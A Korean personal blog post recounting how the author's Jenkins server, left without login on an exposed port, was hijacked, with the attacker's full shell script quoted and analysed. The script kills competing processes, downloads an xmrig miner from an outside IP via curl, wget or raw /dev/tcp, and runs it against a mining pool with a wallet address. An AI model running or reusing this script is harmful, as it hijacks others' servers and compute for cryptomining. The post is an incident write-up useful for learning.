---
title: "Jenkins 서버 해킹당한 썰"
category: "Jenkins"
tags: ["jenkins", "batch", "hacking"]
published: false
---

### 개요

 해킹을 당한 이 서버는 사연이 있다... 이미 해킹을 당한 적이 있는 서버였던 것이다.

 ![img1](/assets/img/2025-02-24-jenkins-hacking/img1.png)

 root 아이디의 비밀번호를 조금 쉬운걸로 해놨었는데 바로 해킹당했다. AWS에서는 키 파일로 로그인해서 생각도 하지 못하고 있었다가 안전불감증 당해버렸다. 서버를 만들어 놓고 다른 공부를 하고 있었는데 갑자기 며칠만에 크레딧이 모두 소진되었다는 문자가 날라왔다. 크레딧은 3달치 정도 사용할 수 있을텐데..? 하고 메일을 들어가보니 웬걸

  ![img2](/assets/img/2025-02-24-jenkins-hacking/img2.png)
  ![img3](/assets/img/2025-02-24-jenkins-hacking/img3.png)

  이 외에도 Dos 공격도 들어왔다고 하는데 비슷한 맥락인 것 같다. 마치 자전거 자물쇠 4자리를 0000부터 9999까지 모두 시도해보듯이 뚫릴 때까지 돌린건데 쉬운거라 뚫린 것이었다. 아침에 확인했는데 하자마자 잠이 깨며 식은 땀이 흘렀다.   
  
  내 서버 안에서 뭘 하는지 살펴볼 생각도 못해보고 일단 서버를 정지시켜놓은 다음에 고객센터에 손이 발이 되도록 빌었다. 예전에 AWS를 사용할 때 RDS에서 자동으로 주기적 스냅샷을 찍는 기능을 켜놓은 친구가 몇백만원 과금을 맞은 일이 있었다. 메일로 있는 영어 없는 영어 써가며 빌자 AWS에서는 "이번만 봐줄게 다음부턴 조심해 ㅇㅇ" 하면서 용서해줬던 일이 기억나서 나도 똑같이 한국어로 빌어보았다... 다행히 자비하신 네이버 클라우드는 없던 일로 해줬고 크레딧으로 쓰고 있던 vcpu 2개, RAM 4GB의 서버를 반납했다. 30만 크레딧은 날라갔지만 그게 중요한가 살아남는게 중요하지,, 그 후 1년동안 무료인 Micro 서버만 사용하고 있었던 것이다. 

  이 서버는 Spring Batch를 스케쥴링하는 서버로 쓰고 있는 Jenkins 서버이다. NCP Micro 서버로 무려 vcpu 1개, RAM 1GB를 지니고 있는 서버이다. 사양이 낮기 때문에 배치를 돌리는 것만으로도 허덕이며 vcpu가 1개인 탓인가 배치를 돌리는 중에는 Jenkins 페이지조차 들어가지 못하고, 뭔가 있어보이려고 모니터링 툴(Prometheus, Grafana)를 사용하고 있는데 cadvisor와 같은 에이전트와의 네트워크 I/O도 안됐다. 때문에 로그를 확인하거나 설정을 바꿔야할때면 Docker 위에서 돌아가는 Jenkins를 재시작하고 job들을 disabled한 후에 작업을 했다.   

  매일 당일 날짜에 해당하는 데이터가 잘 들어왔는지 DB 툴로 확인해보는데 유기시켜놓고 며칠 다른 공부를 하다가 어느날 보니 최근 데이터가 없는 것이었다! 저번에 API 스펙이 변경됐는데 모르고 업데이트를 안한 경우가 종종있어 며칠짜리 날렸구나 하면서 들어가봤는데...

  ![img4](/assets/img/2025-02-24-jenkins-hacking/img4.png)

  이거 뭐임?? 내가 만든게 아니다. 아무리 내가 하수여도 Jenkins 업데이트가 알아서 job으로 만들어져서 된다고??? 말도 안된다. 당장 들어가봤다. 구성에 들어가보니 Build Steps - Execute shell에 이런 것들이 적혀있었다.

```bash
#!/bin/bash

ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|b52e75408\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh"| awk "{if($3>60.0) print $2}" | xargs -I % kill -9 %

if [[ $(whoami) != "root" ]]; then
    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
        kill -9 $tr || : ;
    done;
fi

threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

rm -rf config.json;

d () {
      curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
}


test ! -s trace && \
    d http://118.189.172.141:8080/novoCRM/static/xmrig-6.4.0-linux-x64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-6.4.0/xmrig trace && \
    rm -rf xmrig-6.4.0 && \
    rm -rf trace.tgz;

test ! -x trace && chmod +x trace;

k() {
    ./trace \
        -r 2 \
        -R 2 \
        --keepalive \
        --no-color \
        --donate-level 1 \
        --max-cpu-usage 100 \
        --cpu-priority 3 \
        --print-time 25 \
        --threads ${threadCount:-4} \
        --url $1 \
        --user 85YFie9DTYSZtfZFSXLc3UJXqQAtWvcYc7qpR17rYxkUHa7ntTNFRsLPkFK7Ur3wp7EpJTJePTk8dSogBLquZbpR7d8Ri7e \
        --pass elf2 \
        --keepalive
}

k auto.c3pool.org:13333

```

 이 사람 고수다. 봐도 모르겠다. Linux 명령어들이라 더 모르겠다. 하지만 화가 나니 천천히 파헤쳐보자.

```bash
ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|b52e75408\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh"| awk "{if($3>60.0) print $2}" | xargs -I % kill -9 %

if [[ $(whoami) != "root" ]]; then
    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
        kill -9 $tr || : ;
    done;
fi

threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";
```

 아는 명령어를 보면 ps, grep, kill, echo 등이 있다. 일단 서버 최적화를 위해 흔히 많이들 쓰는 java나 데이터베이스 등의 프로세스를 끝내놓으려는 것 같다. 그리고 if 아래부분은 서버 스펙을 확인하는 부분이다.

```bash
_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

rm -rf config.json;

d () {
      curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
}
```

 d()라는 함수는 더 아래부분에서 쓰이는데 파일 다운로드를 위한 함수이다. 보면 curl, wget, 자체적으로 만든 _curl() 함수를 통해 다양한 방법으로 파일을 다운받으려는 것을 볼 수 있다. _curl()은 다는 이해 못하겠는데 echo 부분을 보니 아마 직접 Http protocol에 맞춰 수기작성해 보내는 것 같다.

```bash
test ! -s trace && \
    d http://118.189.172.141:8080/novoCRM/static/xmrig-6.4.0-linux-x64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-6.4.0/xmrig trace && \
    rm -rf xmrig-6.4.0 && \
    rm -rf trace.tgz;

test ! -x trace && chmod +x trace;
```

 위의 내용을 이해 못해도 이 부분만 보면 해킹범의 의도를 알 수 있다. <code>xmrig</code>때문인데, 구글링을 해보면 암호화폐 채굴 오픈소스 소프트웨어라고 한다. 정리하자면 
 
 1. 자신의 서버에 있는 소프트웨어 압축 파일을 trace.tgz이름으로 다운로드 받고
 2. 압축해제한 후 권한을 주고
 3. k() 함수를 통해 소프트웨어를 실행하는 것이다
   
   그렇다... 이 녀석은 내 서버를 채굴장으로 쓰려고 했던 것이다. 이 스크립트를 crontab(* * * * *)로 설정하여 매 분마다 실행하였다. 하지만 해킹범은 조금 안일했다. 내 서버는 너무 구져서 웬만한 작업은 돌아가지 않는다는 것이었다.

  ![img5](/assets/img/2025-02-24-jenkins-hacking/img5.png)

그래서? 다행히? 피해는? 보지않았다? 몇일치의 데이터정도...? 나름 평화롭게 마무리됐다.

### 감염 경로

 감염 경로는 포트였다. Jenkins 서버의 포트는 9090으로 8080은 cadvisor로 쓰고있었기 때문이다. 아마 8080, 9090, 8081 등과 같은 겹치면 사용하는 포트들을 전부 찔러본 것 같다. 게다가 Jenkins 서버렉때문에 로그인을 풀어놓았었다. Jenkins의 config.xml에서 useSecurity 항목을 false로 시켜놓는 것인데 이렇게 해놓으면 로그인창이 안뜨고 바로 메인화면으로 넘어간다. 그래서 프리패스하고 심지어 Jenkin는 권한도 있기 때문에(사실 어느정도의 권한이 있는지도 모르겠다) 스크립트를 저렇게 실행해놓은 것 같다. 인지하고 나서는 일단 네이버 클라우드 콘솔의 ACG(Access Control Gruop, AWS 보안 그룹과 비슷한듯) 설정에서 접근을 내 IP로만 할 수 있게 바꿔놓았다. 그리고 일단 Jenkins 로그인창부터 되돌리려고 했는데 안되길래 그냥 이대로 쓰고 있다. 기능은 문제없다.

 이전에 해킹을 당한적이 있음에도 안일했던거 인정한다. 하수이기 잘 모르는데 특히 보안은 더 모르고 실감도 나지 않았다(유저 권한 설정, 패스워드 복잡도 등 그저 귀찮기만함). 실감이 안나는 건 공부를 해도 어차피 숙지가 잘 안돼서 안하는 경향이 있다. 핫한 기술들인 k8s, MSA, Kafka 등도 그래서 아직 시도를 안해봤다. 쓸만한 인프라가 있어야 쓰지! 흠흠... 아무튼 그랬는데 직접 맞아보니 아주아주 실감이 잘 난다. 유독 이 서버만 이런다. 데이터베이스 서버로 사용하는 다른 NCP서버나 AWS 서버들은 공격시도조차 없는데 IP가 어디 털린건지 여기만 공격이 들어온다. IP를 바꿔도 되지만 이미 정내미가 떨어져서 서버를 놔주기로 마음먹었다.
 
### 서버 이전

 난 이 서버가 저주받았다고 생각하기로 했다. 성능도 개구진데(같은 스펙의 AWS 서버는 이정도는 아닌데 잘못 뽑혔나도 싶다) 해킹도 두번 당해서 터가 망했다. 그래서 서버를 옮기기로 했다. 어떻게 vcpu 1개, RAM 1GB 서버를 살려보겠다고 기본적인 스왑 메모리부터 배치 어플리케이션내의 성능 최적화나 비동기 프레임워크 webflux 이런 것도 기웃거려봤지만 사실 알고있다... 스케일업이 제일 편한 방법이라는 것을... 더 쓰다간 머리빠질 것 같다.

  그래서 백수인 주제에 큰 맘먹고 AWS Lightsail의 vcpu 2개, RAM 2GB 서버를 샀다. 내 머리털을 위해서라면 한달 12달러? 충분히 줄 수 있다. Docker와 볼륨걸어놓은 Jenkins 폴더를 통째로 압축해서 옮긴 후 새로운 서버에 볼륨을 걸어주니 예전 그대로 실행됐다(여전히 로그인창은 없다). 큰 스펙업은 아니지만 요새 눈에 띄게 머리가 맑아진 것 같다. 배치를 돌리면서도 페이지에 들어가지고 모니터링 에이전트들도 잘 동작한다. 조만간 데이터베이스 서버도 그냥 AWS RDS Freetier로 옮길까 생각하고 있다. 데이터베이스 서버도 역시 너무 느리고 계속 "Communication Link Failure" 오류가 떠서 끝나는 경우가 있는데 커넥션 시간 늘리고 뭐해도 안되고 또 가끔 데이터베이스 드라이버를 못읽어온다드니 꿹딻끿뭻! 계속 배치가 멈추는 일이 발생해 여기도 스트레스가 장난아니다. 스펙은 똑같지만 혹시 옮기면 괜찮나도 싶고 그래도 안되면 데이터베이스 서버도 스펙업시킬 생각이다.  
